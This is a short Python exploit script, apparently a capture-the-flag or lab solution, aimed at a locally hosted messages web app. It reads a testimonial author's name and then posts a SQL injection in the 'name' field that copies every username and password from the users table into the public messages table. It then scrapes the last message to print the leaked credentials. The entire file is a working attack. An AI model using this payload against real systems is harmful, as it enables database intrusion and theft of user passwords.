import requests
import sys
from bs4 import BeautifulSoup
import re


def soupify_response(r):
    return BeautifulSoup(r.text, 'html.parser')

base_addr = "http://0.0.0.0" if len(sys.argv) > 1 else "http://127.0.0.1"

r = requests.get(base_addr+'/messages')
soup = soupify_response(r)
# print(soup)

name_div = soup.find("div", class_="testimonial-writer-name")
name  = name_div.get_text()

injection = name + "'; insert into contact_messages (name, message) select name,password from users; -- This is a comment '"

payload = {'name': injection}

r = requests.post(base_addr+'/messages', data=payload)
soup = soupify_response(r)
# print(soup)

r = requests.get(base_addr+'/messages')
soup = soupify_response(r)
name_div = soup.find_all("div", class_="testimonial-section")[-1]
print(name_div.get_text().strip())

# message = soup.find(string=re.compile("james:"))
# print(message[6:])
